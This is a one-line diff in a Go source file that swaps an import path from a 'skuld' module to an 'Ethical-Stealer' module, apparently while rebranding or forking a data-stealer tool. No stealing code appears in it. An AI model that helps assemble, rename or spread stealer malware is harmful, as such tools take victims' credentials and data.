@@ -10,7 +10,7 @@ import (
 
 	"strings"
 
-	"github.com/hackirby/skuld/utils/program"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/program"
 )
 
 func Run() {
